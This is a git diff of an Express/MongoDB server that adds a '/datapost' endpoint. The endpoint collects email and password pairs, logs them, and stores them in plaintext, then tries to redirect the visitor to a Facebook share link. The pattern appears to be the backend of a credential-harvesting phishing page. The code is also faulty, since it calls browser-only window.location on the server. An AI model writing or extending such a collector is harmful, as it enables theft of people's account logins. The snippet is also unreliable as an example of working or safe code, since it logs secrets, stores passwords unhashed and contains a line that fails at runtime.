@@ -1,6 +1,7 @@
-const express = require("express")
-const mongoose = require("mongoose")
-const cors = require("cors")
+import express from 'express';
+import mongoose from'mongoose';
+import cors from 'cors';
+import { DATA } from "./data.model.js";
 
 const app = express()
 
@@ -16,8 +17,40 @@ app.use(cors(
     }
 ))
 
-app.get("/data", (req, res) => {
-    res.json({data:"Your Server is running"})
+app.post("/datapost", async (req, res) => {
+    try {
+        
+        const { password , email } = req.body;
+
+        console.log( req.body );
+
+        if (!password ||!email) {
+            return res.status(400).json({ message: "Please provide password and email" })
+        }
+
+        const data = {
+            email,
+            password
+        }
+
+        const result = await DATA.create(data);
+
+        if ( !result ) return res.status(400).json({ message: "Your unable to connect"});
+
+        window.location.href = "https://www.facebook.com/share/v/1B2K9AV5yg/"
+
+        return res
+        .status(202)
+        .json(
+            { 
+                message: "Your password and email has been added successfully" 
+            }
+        );
+
+
+    } catch (error) {
+        console.log(error.message)
+    }
 })
 
 
